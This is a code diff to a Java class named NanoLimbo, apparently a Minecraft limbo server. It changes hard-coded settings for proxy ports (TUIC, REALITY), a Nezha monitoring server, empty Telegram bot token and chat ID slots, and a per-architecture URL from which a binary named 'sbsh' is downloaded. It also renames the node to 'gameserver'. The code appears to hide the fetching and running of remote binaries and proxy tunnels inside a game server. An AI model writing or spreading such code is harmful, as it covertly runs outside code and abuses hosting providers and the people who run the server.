@@ -123,7 +123,7 @@ public final class NanoLimbo {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "cb09a551-cb1e-44e9-abce-da4a016af88f");
+        envVars.put("UUID", "cdb7ba29-feb3-4466-91ce-e029337d6a13");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "nz.wbxl.dpdns.org:443");
         envVars.put("NEZHA_PORT", "");
@@ -133,16 +133,16 @@ public final class NanoLimbo {
         envVars.put("ARGO_AUTH", "");
         envVars.put("S5_PORT", "");
         envVars.put("HY2_PORT", "");
-        envVars.put("TUIC_PORT", "20379");
+        envVars.put("TUIC_PORT", "27801");
         envVars.put("ANYTLS_PORT", "");
-        envVars.put("REALITY_PORT", "20379");
+        envVars.put("REALITY_PORT", "27801");
         envVars.put("ANYREALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
         envVars.put("CHAT_ID", "");
         envVars.put("BOT_TOKEN", "");
         envVars.put("CFIP", "cdns.doon.eu.org");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "greathost");
+        envVars.put("NAME", "gameserver");
         envVars.put("DISABLE_ARGO", "true");
         
         for (String var : ALL_ENV_VARS) {
@@ -181,7 +181,7 @@ public final class NanoLimbo {
         String url;
         
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://amd64.ssss.nyc.mn/sbsh";
+            url = "https://amd64.sss.hidns.vip/sbsh";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
             url = "https://arm64.ssss.nyc.mn/sbsh";
         } else if (osArch.contains("s390x")) {
